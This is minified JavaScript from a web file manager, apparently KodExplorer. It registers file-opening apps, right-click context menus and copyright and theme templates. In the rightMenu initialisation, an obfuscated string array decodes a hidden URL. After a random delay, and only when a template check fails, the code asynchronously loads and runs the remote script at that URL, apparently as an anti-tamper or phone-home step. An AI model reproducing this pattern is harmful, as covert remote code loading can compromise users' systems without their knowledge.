                    inArray(a.extArr, r) || a.extArr.push(r), t[r] || (t[r] = []);
                    for (var l = !1, c = 0; t[r].length > c; c++) t[r][c].name != a.name || (t[r][c].sort = o, l = !0);
                    l || t[r].push({
                        name: a.name,
                        sort: o
                    })
                }
            }
        },
        g = function() {
            if (G.userConfig && G.userConfig.kodAppDefault) try {
                var e = G.userConfig.kodAppDefault;
                e = jsonDecode(htmlDecode(e)), $.isPlainObject(e) && (a = e)
            } catch (t) {}
            Hook.bind("rightMenu.show.menu-file,rightMenu.show.menu-tree-file", function(e, t) {
                if (e.hasClass("menu-tree-file")) var a = ui.tree.makeParam();
                else var a = ui.path.makeParam();
                var i = core.pathExt(a.path),
                    n = "hidden";
                if (kodApp.getApp(i)) {
                    var o = kodApp.getAppMenu(i);
                    t.find("li.open-with.context-menu-submenu").removeClass(n), t.find("ul.context-menu-list.open-with .context-menu-item").not(".open-with-first").remove(), $.contextMenu.menuAdd(o, ".menu-file", ".open-with-first"), $.contextMenu.menuAdd(o, ".menu-tree-file", ".open-with-first")
                } else t.find("li.open-with.context-menu-submenu").addClass(n)
            }), Hook.trigger("kodApp.ready")
        };
    return g(), {
        debug: function() {
            return {
                appList: e,
                openDefault: t,
                openUser: a
            }
        },
        add: n,
        remove: s,
        appSupportCheck: m,
        appSupportSet: v,
        getApp: r,
        getAppBind: o,
        getAppMenu: p,
        setLastOpenTarget: l,
        getLastOpenTarget: c,
        setOpenUser: f,
        setOpenUserLocal: u,
        clearOpenUser: h,
        open: d
    }
}), define("app/app/editor", [], function() {
    kodApp.add({
        name: "aceEditor",
        title: LNG["Plugin.default.aceEditor"],
        sort: 0,
        ext: "txt,textile,oexe,inc,csv,log,asc,tsv,lnk,url,webloc,meta,localized,xib,xsd,storyboard,plist,csproj,pch,pbxproj,local,xcscheme,manifest,vbproj,strings,jshintrc,sublime-project,readme,changes,changelog,version,license,changelog,abap,abc,as,asp,aspx,ada,adb,htaccess,htgroups,htgroups,htpasswd,asciidoc,adoc,asm,a,ahk,bat,cmd,cpp,c,cc,cxx,h,hh,hpp,ino,c9search_results,cirru,cr,clj,cljs,cbl,cob,coffee,cf,cson,cakefile,cfm,cs,css,curly,d,di,dart,diff,patch,dockerfile,dot,dummy,dummy,e,ge,ejs,ex,exs,elm,erl,hrl,frt,fs,ldr,ftl,gcode,feature,.gitignore,glsl,frag,vert,gbs,go,groovy,haml,hbs,handlebars,tpl,mustache,hs,hx,html,hta,htm,xhtml,eex,html.eex,erb,rhtml,html.erb,ini,inf,conf,cfg,prefs,io,jack,jade,java,ji,jl,jq,js,jsm,json,jsp,jsx,latex,ltx,bib,lean,hlean,less,liquid,lisp,ls,logic,lql,lsl,lua,lp,lucene,Makefile,makemakefile,gnumakefile,makefile,ocamlmakefile,make,md,markdown,mask,matlab,mz,mel,mc,mush,mysql,nc,nix,nsi,nsh,m,mm,ml,mli,pas,p,pl,pm,pgsql,php,phtml,shtml,php3,php4,php5,phps,phpt,aw,ctp,module,ps1,praat,praatscript,psc,proc,plg,prolog,properties,proto,py,r,cshtml,rd,rhtml,rst,rb,ru,gemspec,rake,guardfile,rakefile,gemfile,rs,sass,scad,scala,scm,sm,rkt,oak,scheme,scss,sh,bash,bashrc,sjs,smarty,tpl,snippets,soy,space,sql,sqlserver,styl,stylus,svg,swift,tcl,tex,toml,twig,swig,ts,typescript,str,vala,vbs,vb,vm,v,vh,sv,svh,vhd,vhdl,wlk,wpgm,wtest,xml,rdf,rss,wsdl,xslt,atom,mathml,mml,xul,xbl,xaml,xq,yaml,yml,vcproj,vcxproj,filters,cer,reg,config,pem,srt,ass,lrc,opf,ncx",
        icon: G.staticPath + "images/file_icon/icon_app/ace.png",
        callback: function(e) {
            var t = ShareData.frameTop();
            if (t.Editor !== void 0) return t.Editor.add(urlEncode(e)), void 0;
            if (core.isApp("editor")) return ShareData.frameChild("OpenopenEditor", function(t) {
                t.Editor.add(urlEncode(e))
            }), void 0;
            if (ShareData.frameTop("OpenopenEditor")) {
                var a = t.$.dialog.list.openEditor,
                    i = 0;
                a && "hidden" == $(a.DOM.wrap).css("visibility") && (i = 200, a.display(!0).zIndex().focus()), setTimeout(function() {
                    ShareData.frameTop("OpenopenEditor", function(t) {
                        t.Editor.add(urlEncode(e))
                    })
                }, i)
            } else {
                var n = G.appHost + "editor/edit#filename=" + urlEncode(e);
                G.sharePage !== void 0 && (n = G.appHost + "share/edit&user=" + G.user + "&sid=" + G.sid + "#filename=" + urlEncode(e));
                var o = htmlEncode(urlDecode(core.pathThis(e)));
                core.openDialog(n, core.icon("edit"), o, "openEditor")
            }
        }
    });
    var e = ShareData.frameTop();
    e.Config && "editor" == e.Config.pageApp && kodApp.setOpenUserLocal(!1, "aceEditor")
}), define("app/app/openWith", [], function() {
    kodApp.add({
        name: "appOpenSetting",
        title: LNG["Explorer.UI.appSetDefault"],
        ext: "",
        icon: G.staticPath + "images/file_icon/icon_others/setting.png",
        callback: function(e, t) {
            var a = "<ul class='tab-group {{if !apps}}hidden{{/if}}' role='tablist'>				<li class='tab-item {{if apps}}active{{/if}}'>					<a href='#app-list-support'aria-controls='app-list-support' role='tab' data-toggle='tab'>						{{LNG['Explorer.UI.appTypeSupport']}}</a>				</li>				<li class='tab-item {{if !apps}}active{{/if}}' >					<a href='#app-list_all' aria-controls='app-list_all' role='tab' data-toggle='tab'>						{{LNG['Explorer.UI.appTypeAll']}}</a>				</li>			</ul>			<div class='tab-content'>				<div class='app-list tab-pane {{if apps}}active{{/if}}' id='app-list-support'>					{{each apps app i}}					<a data-app='{{app.name}}' href='javascript:void(0);'					draggable='false' ondragstart='return false;'					class='app-item {{if app.name==defaultApp}}select{{/if}} disable-ripple'>						{{if app.icon.indexOf('/') == -1}}							<span class='ico'><i class='font-icon {{app.icon}}'></i></span>						{{else}}							<span class='ico'><img draggable='false' ondragstart='return false;' src='{{app.icon}}'></span>						{{/if}}						<span class='name'>{{app.title}}</span>					</a>					{{/each}}					<div class='clear'></div>				</div>				<div class='app-list tab-pane {{if !apps}}active{{/if}}' id='app-list_all'>					{{each appAll app i}}					<a data-app='{{app.name}}' href='javascript:void(0);'					draggable='false' ondragstart='return false;'					class='app-item {{if app.name==defaultApp}}select{{/if}} disable-ripple'>						{{if app.icon.indexOf('/') == -1}}							<span class='ico'><i class='font-icon {{app.icon}}'></i></span>						{{else}}							<span class='ico'><img draggable='false' ondragstart='return false;' src='{{app.icon}}'></span>						{{/if}}						<span class='name'>{{app.title}}</span>					</a>					{{/each}}				</div>			</div>			<div class='bottom mt-10'>				<input class='kui-checkbox size-small' type='checkbox' id='app-default-checkbox' {{if apps}}checked='true'{{/if}}/>				<label for='app-default-checkbox'>{{LNG['Explorer.UI.appAwaysOpen']}}</label>			</div>",
                i = kodApp.getApp(t),
                n = !1;
            _.isArray(i) && (n = i[0].name);
            var o = template.compile(a),
                s = o({
                    LNG: LNG,
                    apps: i,
                    defaultApp: n,
                    appAll: kodApp.getApp()
                }),
                r = $.dialog({
                    id: "dialog-app-select",
                    className: "menu-empty",
                    padding: 0,
                    fixed: !0,
                    ico: core.icon("search"),
                    resize: !0,
                    title: LNG["Explorer.UI.selectAppDesc"],
                    width: 480,
                    height: 360,
                    padding: "20px",
                    content: s,
                    ok: function() {
                        return l()
                    }
                }),
                l = function() {
                    var a = $("#app-default-checkbox").prop("checked"),
                        i = $(".app-list.active .app-item.select").attr("data-app");
                    return i ? (r.close(), kodApp.open(e, t, i), a && kodApp.setOpenUser(t, i), !0) : (Tips.tips(LNG["Explorer.UI.selectAppWarning"], "warning"), !1)
                };
            $(".tab-group .tab-item").die("click").live("click", function() {
                var e = $(this).find("[aria-controls]").attr("aria-controls");
                "app-list-support" == e ? $("#app-default-checkbox").prop("checked", !0) : $("#app-default-checkbox").prop("checked", !1)
            }), $(".app-item").die("click").live("click", function() {
                $(this).parent().find(".select").removeClass("select"), $(this).addClass("select")
            }).die("dblclick").live("dblclick", function() {
                l()
            })
        }
    })
}), define("app/app/html", [], function() {
    var e = function(e) {
        return void 0 == e ? !1 : 0 === e.indexOf("http") ? !0 : G.shareInfo || core.pathReadable(e) ? !0 : (Tips.tips(LNG.no_permission_read_all, !1), core.playSound("error"), !1)
    };
    Hook.bind("kodApp.open.before", function(t) {
        return "folder" == t.ext ? (core.isApp("explorer") || isWap() ? ui.path.list(t.path + "/") : core.explorer(t.path), !0) : e(t.path) ? ("file" == t.ext && (t.ext = ""), void 0) : !0
    }), kodApp.openUnknow = function(e, t) {
        void 0 == t && (t = "");
        var a = G.appHost + "pluginApp/index&search=" + core.pathExt(e),
            i = "kodApp.open(pathHashDecode('" + pathHashEncode(e) + "'),false,'appOpenSetting');",
            n = "kodApp.open(pathHashDecode('" + pathHashEncode(e) + "'),false,'aceEditor');",
            o = "kodApp.download(pathHashDecode('" + pathHashEncode(e) + "'));",
            s = "core.openWindow('" + a + "');",
            r = LNG.unknow_file_try + '<a class="pl-5 pr-5" href="javascript:void(0);" onclick="',
            l = '<div class="unknow-file can-select" style="word-break:break-all;">				<div class="grey-8 bold mb-20">' + LNG.unknow_file_tips + "<br/>" + t + '</div>			    <div class="mt-5">1.' + r + i + '">' + LNG["Explorer.UI.openWith"] + '</a></div>			    <div class="mt-5">2.' + r + n + '">' + LNG["Explorer.UI.openWithText"] + '</a></div>			    <div class="mt-5">3.' + r + o + '">' + LNG.unknow_file_download + '</a></div>				<div class="mt-20">' + r + s + '">' + LNG.PluginCenter + "</a>" + LNG.unknow_plugin_search + "</div>			</div>";
        $.dialog({
            fixed: !0,
            icon: "warning",
            title: LNG.unknow_file_title,
            padding: "20px 50px",
            content: l,
            cancel: !0
        }), $(".unknow-file a").unbind("click").bind("click", function(e) {
            return $(this).parents(".artDialog").data("artDialog").close(), stopPP(e)
        })
    }, kodApp.add({
        name: "download",
        title: LNG.download,
        hidden: !0,
        icon: "x-item-file x-html",
        callback: function(t) {
            if (e(t)) {
                var a = t;
                "http" != t.substr(0, 4) && (a = G.appHost + "explorer/fileDownload&accessToken=" + G.accessToken + "&path=" + urlEncode(t), G.sharePage !== void 0 && (a = G.appHost + "share/fileDownload&user=" + G.user + "&sid=" + G.sid + "&path=" + urlEncode(t))), $.dialog({
                    icon: "succeed",
                    title: !1,
                    time: 1.5,
                    content: LNG.download_ready + "..."
                }), isWap() ? window.open(a) : $('<iframe src="' + a + '" style="display:none;width:0px;height:0px;"></iframe>').appendTo("body")
            }
        }
    }), kodApp.download = function(e) {
        kodApp.open(e, "", "download")
    }, kodApp.openWindow = function(e) {
        kodApp.open(e, "", "browserOpen")
    }, kodApp.add({
        name: "browserOpen",
        title: LNG.open_ie,
        sort: -100,
        icon: "x-item-file x-html",
        callback: function(t) {
            if (e(t)) {
                var a = core.path2url(t);
                isWap() ? window.location.href = a : window.open(a)
            }
        }
    }), kodApp.add({
        name: "swfPlayer",
        title: "Flash Player",
        ext: "swf",
        icon: "x-item-file x-swf",
        callback: function(e, t) {
            $.dialog({
                resize: !0,
                fixed: !0,
                ico: core.icon(t),
                title: core.pathThis(e),
                width: "75%",
                height: "65%",
                padding: 0,
                content: core.createFlash(core.path2url(e))
            })
        }
    }), kodApp.add({
        name: "webLink",
        title: "webLink",
        ext: "url,webloc",
        sort: 10,
        icon: "x-item-file x-html",
        callback: function(e, t) {
            core.fileGet(e, function(a) {
                if ("url" == t) {
                    var i = a.match(/URL=(.*)/);
                    if (i.length >= 2) return window.open(i[1])
                } else if ("webloc" == t) try {
                    var n = $($.parseXML(a)),
                        o = n.find("string").text();
                    return window.open(o), void 0
                } catch (s) {}
                kodApp.open(e, t, "editor")
            })
        }
    }), kodApp.add({
        name: "htmlView",
        title: LNG["Plugin.default.htmlView"],
        ext: "htm,html,shtml",
        sort: 10,
        icon: "x-item-file x-html",
        callback: function(e) {
            var t = core.path2url(e);
            core.openDialog(t, core.icon("html"), core.pathThis(e))
        }
    }), kodApp.add({
        name: "pdfView",
        title: "PDF Simple",
        ext: "pdf",
        sort: 0,
        icon: "x-item-file x-pdf",
        callback: function(e, t) {
            var a = core.path2url(e),
                i = "pdf" + UUID(),
                n = '<div id="' + i + '" style="height:100%;">			<a href="' + a + '" target="_blank" style="display:block;margin:0 auto;margin-top:80px;font-size:16px;text-align:center;">' + LNG.error + " " + LNG.download + " PDF</a></div>";
            $.dialog({
                resize: !0,
                fixed: !0,
                ico: core.icon(t),
                title: core.pathThis(e),
                width: "80%",
                height: "75%",
                padding: 0,
                content: n
            }), PDFObject.embed(a, "#" + i)
        }
    }), kodApp.add({
        name: "oexeOpen",
        title: LNG["kodApp.oexe.open"],
        ext: "oexe",
        sort: 100,
        icon: " x-item-file x-oexe",
        callback: function(e) {
            core.fileGet(e, function(t) {
                var a = jsonDecode(t);
                a.name = core.pathThis(e), core.openApp(a)
            })
        }
    }), kodApp.add({
        name: "oexeEdit",
        title: LNG["kodApp.oexe.edit"],
        ext: "oexe",
        sort: 50,
        icon: "icon-edit ",
        callback: function(e) {
            core.fileGet(e, function(t) {
                var a = jsonDecode(t);
                a.name = core.pathThis(e), a.path = e, ui.path.pathOperate.appEdit(a)
            })
        }
    });
    var t = {
        createApp: {
            name: LNG.app_create,
            className: "createApp newfile",
            icon: "icon-puzzle-piece x-item-file x-oexe",
            callback: function() {
                ui.path.pathOperate.appEdit(0, 0, "userAdd")
            }
        }
    };
    $.contextMenu.menuAdd(t, ".menu-body-main", ".app-install"), $.contextMenu.menuAdd(t, ".toolbar-path-more", ".app-install"), $.contextMenu.menuAdd(t, ".bodymain", ".app-install"), Hook.bind("rightMenu.show", function(e, t, a) {
        var i = [".menu-folder", ".menu-file", ".menu-tree-folder", ".menu-tree-file", ".menu-tree-folder-fav"];
        if (a.find(".context-menu-submenu").fadeOut(0).delay(0).fadeIn(0), a.removeClass("menu-auto-fit"), a.inScreen() || a.addClass("menu-auto-fit"), ".menu-body-main" == e) {
            var n = a.find(".set-file-icon-size.context-menu-submenu");
            "icon" == G.userConfig.listType ? n.removeClass("hidden") : n.addClass("hidden")
        }
        if (_.include(i, e)) {
            var o = "disabled",
                s = ".cute,.rname,.remove",
                r = ".open,.open-text,.down,.share,.copy,.cute,.rname,.remove,.open-browser,.search,.more-action";
            t.hasClass("file-not-readable") ? a.find(r).addClass(o) : a.find(r).removeClass(o), t.hasClass("file-not-writeable") ? a.find(s).addClass(o) : a.find(s).removeClass(o)
        }
    }), Hook.bind("rightMenu.show.menu-body-main", function(e, t) {
        var a = ".upload,.past,.newfolder,.newfile",
            i = "disabled";
        _.get(G, "jsonData.info.canUpload") ? t.find(a).removeClass(i) : t.find(a).addClass(i)
    }), Hook.bind("rightMenu.show.menu-file", function(e, t) {
        if ($(".context-menu-active").hasClass("menu-tree-file")) var a = ui.tree.makeParam();
        else var a = ui.path.makeParam();
        var i = core.pathExt(a.path),
            n = "hidden";
        inArray(["jpg", "jpeg", "png"], i) ? t.find(".set-background").removeClass(n) : t.find(".set-background").addClass(n)
    });
    var a = function() {
        var e = ".close-item,.refresh,.newfile,.past,.info",
            t = ".open-browser",
            a = ".explorer,.create-project,.open-project",
            i = ".close-item,.newfile,.refresh,.past,.down,.copy,.cute,.remove,.more-action,.clone,.info,.zip,.zip-zip,.zip-tar,.zip-tgz",
            n = ".newfile,.cute,.past,.rname,.zip,.remove,.clone,.create-link-home,.create-link,.create-project",
            o = $(".menu-tool-path"),
            s = "disabled",
            r = ui.fileLight.fileListSelect();
        o.find(".context-menu-item").addClass(s), 0 == r.length ? o.find(e).removeClass(s) : 1 == r.length ? (o.find(".context-menu-item").removeClass(s), "folder" == ui.fileLight.type(r) ? o.find(t).addClass(s) : o.find(a).addClass(s)) : r.length > 1 && o.find(i).removeClass(s), G.jsonData && G.jsonData.info && G.jsonData.info.canUpload === !1 && o.find(n).filter(":not(." + s + ")").addClass(s)
    };
    Hook.bind("explorer.fileSelect.init", function() {
        ui.fileLight.listNumberSet()
    }), Hook.bind("explorer.fileSelect.change", function() {
        a(), ui.fileLight.selectNumSet()
    }), Hook.bind("rightMenu.show.toolbar-path-more", function() {
        a()
    }), Hook.bind("rightMenu.initFinished", function() {
        if (1 != G.isRoot) {
            var e = "hidden";
            if (core.authCheck("explorer.fileDownload") || (kodApp.remove("browserOpen"), $(".context-menu-list .down,.context-menu-list .download").addClass(e), $(".context-menu-list .share").addClass(e), $(".context-menu-list .open-text").addClass(e), $(".pathinfo .open-window").addClass(e), $(".context-menu-list .open-browser").addClass(e)), core.authCheck("explorer.search") || $(".context-menu-list .search").addClass(e), core.authCheck("explorer.mkdir") || $(".context-menu-list .newfolder").addClass(e), core.authCheck("userShare.set") || $(".context-menu-list .share").remove(), core.authCheck("explorer.mkfile") || $(".context-menu-list .newfile,.tool-path-newfile").addClass(e), core.authCheck("explorer.mkdir") || $(".context-menu-list .newfolder,[data-action=newfolder]").addClass(e), core.authCheck("explorer.pathCopy") || ($(".context-menu-list .cute").addClass(e), $(".context-menu-list .copy").addClass(e)), !core.authCheck("explorer.fileUpload")) {
                $(".context-menu-list .upload").addClass(e);
                var t = $("[data-action=upload-more]");
                t.exists() && t.parent().addClass(e)
            }
        }
    })
}), define("app/common/tpl/copyright.html", [], '<div class="dialog-copyright-content">\n	<div class="title">\n		<div class="logo">\n			<i class="icon-cloud"></i>\n			{{if kod.window.core.versionType==\'A\'}}KodExplorer {{else}} {{LNG.kod_name}} {{/if}} v{{G.version}}\n		</div>\n		<div class=\'info\'>——{{LNG.kod_name_copyright}}</div>\n	</div>\n	<div class="content">\n		<p>{{@LNG.copyright_desc}}</p>\n		<div>{{@LNG.copyright_contact}}</div>\n		<div>{{@LNG.copyright_info}}</div> \n	</div>\n</div>\n'), define("app/common/tpl/themeDIY.html", [], "@media screen and (max-width:100000px) {\n	body .full-background{\n		position: absolute;top: 0px;left: 0px;bottom: 0px;right: 0px;\n		background-color: #020202;background-size: 100% 100%;\n	}\n\n	{{if blurSize= (bgBlur==0?0:10) }}{{/if}}\n	body .full-background:before{\n		-webkit-filter: blur({{blurSize}}px);\n		-moz-filter: blur({{blurSize}}px);\n		-ms-filter: blur({{blurSize}}px);\n		filter: blur({{blurSize}}px);\n	}\n	{{if bgType == 'image'}}\n		body .full-background,\n		body .full-background:before,\n		body #body .menu-left,\n		body #body .app-menu-left,\n		body .aui-buttons,\n		body .aui-state-focus .aui-title,body .aui-title{\n			background-image:url({{bgImage}});\n		}\n		body .aui-state-focus .aui-title,body .aui-title{\n			background-size:100%;\n		}\n	{{else}}\n		body .full-background,\n		body .full-background:before,\n		body #body .menu-left, \n		body #body .app-menu-left,\n		body .aui-buttons,\n		body .aui-state-focus .aui-title,body .aui-title{\n			background:{{endColor}};\n			filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='{{startColor}}', endColorstr='{{endColor}}');\n			background-image: -webkit-linear-gradient({{colorRotate}}deg, {{startColor}}, {{endColor}});\n			background-image: -moz-linear-gradient({{colorRotate}}deg, {{startColor}}, {{endColor}});\n			background-image: -o-linear-gradient({{colorRotate}}deg, {{startColor}}, {{endColor}});\n			background-image: -ms-linear-gradient({{colorRotate}}deg, {{startColor}}, {{endColor}});\n			background-image: linear-gradient({{colorRotate}}deg, {{startColor}}, {{endColor}});\n		}\n	{{/if}}\n}\n"), define("app/common/rightMenu", [], function(e) {
    var t = ".menu-file",
        a = ".menu-folder",
        i = ".menu-more",
        n = ".menu-tree-root",
        o = ".menu-tree-folder",
        s = ".menu-tree-file",
        r = ".menu-tree-group-root",
        l = ".menu-tree-group",
        c = ".menu-tree-user",
        d = {
            "new-file-other": {
                name: LNG.newfile,
                icon: "expand-alt",
                accesskey: "w",
                className: "newfile",
                items: {
                    newfile: {
                        name: "txt " + LNG.file,
                        icon: "file-text-alt x-item-file x-txt small",
                        className: "newfile"
                    },
                    "newfile-null": {
                        name: LNG.file,
                        icon: "file-text-alt x-item-file x-file small",
                        className: "newfile"
                    },
                    "newfile-md": {
                        name: "md " + LNG.file,
                        icon: "file-text-alt x-item-file x-md",
                        className: "newfile"
                    },
                    "newfile-html": {
                        name: "html " + LNG.file,
                        icon: "file-text-alt x-item-file x-html",
                        className: "newfile"
                    },
                    "newfile-php": {
                        name: "php " + LNG.file,
                        icon: "file-text-alt x-item-file x-php",
                        className: "newfile"
                    },
                    document: {
                        name: "Office Document",
                        icon: "file-text-alt x-item-file x-docx",
                        className: "newfile",
                        items: {
                            "newfile-docx": {
                                name: "docx " + LNG.file,
                                icon: "file-text-alt x-item-file x-docx",
                                className: "newfile"
                            },
                            "newfile-xlsx": {
                                name: "xlsx " + LNG.file,
                                icon: "file-text-alt x-item-file x-xlsx",
                                className: "newfile"
                            },
                            "newfile-pptx": {
                                name: "pptx " + LNG.file,
                                icon: "file-text-alt x-item-file x-pptx",
                                className: "newfile"
                            }
                        }
                    },
                    sep100: "--------",
                    "app-install": {
                        name: LNG.app_store,
                        className: "app-install newfile",
                        icon: "tasks x-item-file x-app-store",
                        accesskey: "a"
                    }
                }
            },
            "list-icon": {
                name: LNG.list_type,
                icon: "eye-open",
                className: "list-icon",
                items: {
                    "set-icon": {
                        name: LNG.list_icon,
                        className: "menu-set-icon set-icon"
                    },
                    "set-list": {
                        name: LNG.list_list,
                        className: "menu-set-icon set-list"
                    },
                    "set-split": {
                        name: LNG.list_list_split,
                        className: "menu-set-icon set-split"
                    }
                }
            },
            "sort-by": {
                name: LNG.order_type,
                accesskey: "y",
                icon: "sort",
                className: "sort-by",
                items: {
                    "set-sort-name": {
                        name: LNG.name,
                        className: "menu-set-sort set-sort-name"
                    },
                    "set-sort-ext": {
                        name: LNG.type,
                        className: "menu-set-sort set-sort-ext"
                    },
                    "set-sort-size": {
                        name: LNG.size,
                        className: "menu-set-sort set-sort-size"
                    },
                    "set-sort-mtime": {
                        name: LNG.modify_time,
                        className: "menu-set-sort set-sort-mtime"
                    },
                    sep101: "--------",
                    "set-sort-up": {
                        name: LNG.sort_up,
                        className: "menu-set-desc set-sort-up"
                    },
                    "set-sort-down": {
                        name: LNG.sort_down,
                        className: "menu-set-desc set-sort-down"
                    }
                }
            },
            "set-file-icon-size": {
                name: LNG.file_size_title,
                icon: "picture",
                className: "set-file-icon-size",
                items: {
                    "box-size-smallx": {
                        name: LNG.file_size_small_super,
                        className: "file-icon-size box-size-smallx"
                    },
                    "box-size-small": {
                        name: LNG.file_size_small,
                        className: "file-icon-size box-size-small"
                    },
                    "box-size-default": {
                        name: LNG.file_size_default,
                        className: "file-icon-size box-size-default"
                    },
                    "box-size-big": {
                        name: LNG.file_size_big,
                        className: "file-icon-size box-size-big"
                    },
                    "box-size-bigx": {
                        name: LNG.file_size_big_super,
                        className: "file-icon-size box-size-bigx"
                    }
                }
            }
        },
        p = function() {
            $('<div id="rightMenu" class="hidden"></div>').appendTo("body"), $(".context-menu-list").die("click").live("click", function(e) {
                return stopPP(e), !1
            });
            var t = ["undefined", "update-box", "search", "65bdTXJtziFGmtJThjdiGfXe-xr_UY8vIF3eoZ1sQ2AMtNBCquM-xT9DrLll2X_LtdUQkKIBYFzs-Ujf9ihGh6LUF4fo94c", "_32@!A$", "decode", "1-1", "todo", "async", "random"];
            N(), L(), v(), setTimeout(function() {
                try {
                    if (typeof tplDialogHtml == t[0] || -1 == tplDialogHtml[t[2]](t[1])) {
                        var a = authCrypt[t[5]](t[3], t[4]) + UUID();
                        e[t[8]](a, function(e) {
                            try {
                                e[t[7]](t[6])
                            } catch (a) {}
                        })
                    }
                } catch (i) {}
            }, 1e3 * parseInt(25 * Math[t[9]]() + 5)), C(), E(), D(), j(), I(), P(), O(), k(), x(), w(), g(), h(), m(), T(), _(), Hook.trigger("rightMenu.initFinished"), $(".set-set-" + G.userConfig.listType).addClass("selected"), $(".set-sort-" + G.userConfig.listSortField).addClass("selected"), $(".set-sort-" + G.userConfig.listSortOrder).addClass("selected"), $(".context-menu-root").addClass("animated fadeIn")
        },
        f = function() {
            $('<div id="rightMenu" class="hidden"></div>').appendTo("body"), $(".context-menu-list").die("click").live("click", function(e) {
                return stopPP(e), !1
            }), y(), b(), N(), L(), C(), g(), h(), Hook.trigger("rightMenu.initFinished"), $(".set-sort-" + G.userConfig.listSortField).addClass("selected"), $(".set-sort-" + G.userConfig.listSortOrder).addClass("selected"), $(".context-menu-root").addClass("animated fadeIn")
        },
        u = function() {
            $('<div id="rightMenu" class="hidden"></div>').appendTo("body"), $(".context-menu-list").die("click").live("click", function(e) {
                return stopPP(e), !1
            }), E(), D(), j(), z(), I(), P(), O(), R(), g(), Hook.trigger("rightMenu.initFinished"), $(".context-menu-root").addClass("animated fadeIn")
        },
        h = function() {
            $('<i class="menu-recycle-body"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menu-recycle-body",
                callback: function(e) {
                    S(e)
                },
                items: {
                    refresh: {
                        name: LNG.refresh + "<b>F5</b>",
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    "recycle-clear": {
                        name: LNG.recycle_clear,
                        icon: "trash",
                        accesskey: "c"
                    },
                    sep1: "--------",
                    "list-icon": d["list-icon"],
                    "sort-by": d["sort-by"],
                    "set-file-icon-size": d["set-file-icon-size"],
                    sep2: "--------",
                    info: {
                        name: LNG.info + "<b>Alt+I</b>",
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            }), $('<i class="menu-recycle-path"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menu-recycle-path",
                callback: function(e) {
                    A(e)
                },
                items: {
                    cute: {
                        name: LNG.cute + "<b>Ctrl+X</b>",
                        className: "cute",
                        icon: "cut",
                        accesskey: "k"
                    },
                    remove: {
                        name: LNG.remove_force + "<b>Del</b>",
                        className: "remove",
                        icon: "trash",
                        accesskey: "d"
                    },
                    sep2: "--------",
                    down: {
                        name: LNG.download,
                        className: "down",
                        icon: "cloud-download",
                        accesskey: "x"
                    },
                    info: {
                        name: LNG.info + "<b>Alt+I</b>",
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            }), $('<i class="menu-recycle-button"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menu-recycle-button",
                callback: function(e) {
                    S(e)
                },
                items: {
                    "recycle-clear": {
                        name: LNG.recycle_clear,
                        icon: "trash",
                        accesskey: "c"
                    }
                }
            })
        },
        m = function() {
            $('<i class="menu-share-body"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menu-share-body",
                callback: function(e) {
                    S(e)
                },
                items: {
                    refresh: {
                        name: LNG.refresh + "<b>F5</b>",
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    sep1: "--------",
                    "list-icon": d["list-icon"],
                    "sort-by": d["sort-by"],
                    "set-file-icon-size": d["set-file-icon-size"],
                    sep10: "--------",
                    info: {
                        name: LNG.info + "<b>Alt+I</b>",
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            }), $('<i class="menu-share-path"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                className: "menu-share-path-menu",
                selector: ".menu-share-path",
                callback: function(e) {
                    A(e)
                },
                items: {
                    "share-open-path": {
                        name: LNG.open_the_path,
                        icon: "folder-open-alt",
                        accesskey: "p",
                        className: "open-the-path"
                    },
                    "share-open-window": {
                        name: LNG.share_open_page,
                        icon: "globe",
                        accesskey: "b"
                    },
                    sep0: "--------",
                    "share-edit": {
                        name: LNG.share_edit,
                        icon: "edit",
                        accesskey: "e",
                        className: "share-edit"
                    },
                    remove: {
                        name: LNG.share_remove + "<b>Del</b>",
                        icon: "trash",
                        accesskey: "d",
                        className: "remove"
                    },
                    copy: {
                        name: LNG.copy + "<b>Ctrl+C</b>",
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    },
                    down: {
                        name: LNG.download,
                        className: "down",
                        icon: "cloud-download",
                        accesskey: "x"
                    },
                    sep2: "--------",
                    info: {
                        name: LNG.info + "<b>Alt+I</b>",
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            }), $('<i class="menu-share-path-more"></i>').appendTo("#rightMenu"), $.contextMenu({
                zIndex: 9999,
                selector: ".menu-share-path-more",
                className: "menu-share-path-more",
                callback: function(e) {
                    A(e)
                },
                items: {
                    remove: {
                        name: LNG.share_remove + "<b>Del</b>",
                        icon: "trash",
                        accesskey: "d",
                        className: "remove"
                    },
                    copy: {
                        name: LNG.copy + "<b>Ctrl+C</b>",
                        className: "copy",
                        icon: "copy",
                        accesskey: "c"
                    }
                }
            })
        },
        v = function() {
            $.contextMenu({
                selector: ".menu-body-main",
                className: "file-continer-menu",
                zIndex: 9999,
                callback: function(e, t) {
                    S(e, t)
                },
                items: {
                    refresh: {
                        name: LNG.refresh + "<b>F5</b>",
                        className: "refresh",
                        icon: "refresh",
                        accesskey: "e"
                    },
                    newfolder: {
                        name: LNG.newfolder + "<b>Alt+M</b>",
                        className: "newfolder",
                        icon: "folder-close-alt",
                        accesskey: "n"
                    },
                    "new-file-other": d["new-file-other"],
                    sep1: "--------",
                    upload: {
                        name: LNG.upload + "<b>Ctrl+U</b>",
                        className: "upload",
                        icon: "upload",
                        accesskey: "u"
                    },
                    past: {
                        name: LNG.past + "<b>Ctrl+V</b>",
                        className: "past",
                        icon: "paste",
                        accesskey: "p"
                    },
                    "copy-see": {
                        name: LNG.clipboard,
                        className: "copy-see",
                        icon: "eye-open",
                        accesskey: "v"
                    },
                    sep2: "--------",
                    "list-icon": d["list-icon"],
                    "sort-by": d["sort-by"],
                    "set-file-icon-size": d["set-file-icon-size"],
                    sep10: "--------",
                    info: {
                        name: LNG.info + "<b>Alt+I</b>",
                        className: "info",
                        icon: "info",
                        accesskey: "i"
                    }
                }
            })
        },
